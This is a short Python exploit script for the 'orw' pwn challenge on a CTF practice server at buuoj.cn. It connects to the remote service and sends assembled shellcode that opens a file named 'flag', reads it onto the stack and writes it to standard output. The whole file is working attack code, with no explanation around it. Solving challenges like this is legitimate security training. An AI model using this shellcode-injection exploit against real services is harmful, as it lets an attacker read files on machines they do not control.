from sgtlibc.gamebox import *
import sgtlibc
from argparse import ArgumentError
from typing import Callable
from sgtpyutils.logger import logger

set_config(GameBoxConfig(
    is_local=False,
    file='./orw',
    remote='node4.buuoj.cn:26542',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))


s = sgtlibc.Searcher()
elf = client.elf

sh = shellcraft.open('flag')
sh += shellcraft.read('eax','esp',100)
sh += shellcraft.write(1,'esp',100)
sh = asm(sh)
sl(sh)

interactive()
